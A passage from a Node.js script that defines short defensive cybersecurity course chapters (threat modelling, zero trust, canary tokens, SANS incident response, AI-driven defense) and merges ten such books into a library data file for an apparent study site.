            <tr><td><strong>Denial of Service</strong></td><td>Availability</td><td>Rate Limiting, Elastic Auto-Scaling, DDoS Filtering</td></tr>
            <tr><td><strong>Elevation of Privilege</strong></td><td>Authorization</td><td>Role-Based Access Control (RBAC), Least Privilege</td></tr>
          </tbody>
        </table>
      </div>
    `),
    makeChapter(21005, 5, "Zero Trust Architecture & Blast Radius Reduction", "Micro-Segmentation, Least Privilege & Ephemeral Credentials",
      "Implement the Zero Trust Architecture: 'Never Trust, Always Verify'.", 26, `
      <h3>5.1 Core Pillars of Zero Trust Architecture</h3>
      <p>Assume breach. Enforce strict identity verification, mutual TLS (mTLS), and dynamic context-aware authorization for every internal transaction.</p>
    `),
    makeChapter(21006, 6, "Active Deception & Cyber Honeytokens", "Canary Tokens, Decoy Credentials & Deception Technologies",
      "Deploy proactive deception traps to detect attackers immediately upon initial lateral movement.", 26, `
      <h3>6.1 Canary Tokens & Honey Credentials</h3>
      <p>Planting fake AWS access keys in git repositories or decoy admin accounts in Active Directory triggers high-confidence alarms the second an attacker touches them.</p>
    `),
    makeChapter(21007, 7, "Incident Response in Hostile Asymmetric Environments", "SANS 6-Step Incident Handling Cycle & Root Cause Analysis",
      "Execute structured incident response playbooks during an active cyber intrusion.", 26, `
      <h3>7.1 The SANS 6-Step Incident Response Cycle</h3>
      <p>1. Preparation &rarr; 2. Identification &rarr; 3. Containment &rarr; 4. Eradication &rarr; 5. Recovery &rarr; 6. Lessons Learned.</p>
    `),
    makeChapter(21008, 8, "The Future of Cyber Conflict & AI-Driven Defense", "AI-Powered Malware, Automated Exploit Generation & Defensive LLM Agents",
      "Explore the future of generative AI in automated vulnerability discovery and real-time incident triage.", 28, `
      <h3>8.1 Autonomous Vulnerability Discovery & Defensive Agents</h3>
      <p>Machine learning models and Large Language Models are accelerating both automated fuzzing by adversaries and autonomous patch generation and incident analysis by defenders.</p>
    `)
  ]
};

// ------------------------------------------------------------------------------------------------
// Merge & Update All 10 Books into technical-library-data.js
// ------------------------------------------------------------------------------------------------
const allNewCyberBooks = [book201, book202, book203, book204, book205, book206, book207, book208, book209, book210];

allNewCyberBooks.forEach(newBook => {
  const existingIdx = library.books.findIndex(b => b.id === newBook.id);
  if (existingIdx >= 0) {
    library.books[existingIdx] = newBook;
  } else {
    library.books.push(newBook);
  }
});

library.totalBooks = library.books.length;
let totalChapters = 0;
library.books.forEach(b => totalChapters += (b.chapters || []).length);
library.totalChapters = totalChapters;

const finalFileContent = 'window.PREPSPACE_LIBRARY = ' + JSON.stringify(library, null, 2) + ';\n';
fs.writeFileSync(targetFilePath, finalFileContent, 'utf8');

console.log('Successfully expanded all 10 Cybersecurity Books with deep, authentic technical content!');
console.log('Total Books:', library.books.length, '| Total Chapters in library:', totalChapters);
